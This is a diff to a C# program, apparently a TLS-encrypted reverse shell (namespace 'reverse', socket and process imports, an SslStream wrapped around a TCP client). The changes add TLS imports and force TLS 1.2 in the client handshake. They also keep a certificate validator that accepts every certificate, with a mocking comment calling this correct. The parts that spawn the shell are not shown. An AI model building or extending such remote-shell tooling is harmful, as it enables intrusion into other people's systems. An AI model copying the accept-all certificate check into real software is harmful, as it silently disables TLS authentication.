@@ -1,8 +1,11 @@
-﻿using System;
+using System;
 using System.Text;
 using System.IO;
 using System.Diagnostics;
 using System.Net.Sockets;
+using System.Security.Cryptography.X509Certificates;
+using System.Net.Security;
+using System.Security.Authentication;
 
 namespace reverse
 {
@@ -29,7 +32,7 @@ namespace reverse
             {
                 using (SslStream stream = new SslStream(client.GetStream(), false, new RemoteCertificateValidationCallback(ValidateServerCertificate), null))
                 {
-                    stream.AuthenticateAsClient(server);
+                    stream.AuthenticateAsClient(host, null, SslProtocols.Tls12, false);
                     using (StreamReader rdr = new StreamReader(stream))
                     {
                         streamWriter = new StreamWriter(stream);
@@ -65,7 +68,7 @@ namespace reverse
 
         public static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
         {
-            // 100% correct way of validating the cert. 
+            // 100% correct way of validating the cert.
             return true;
         }
 
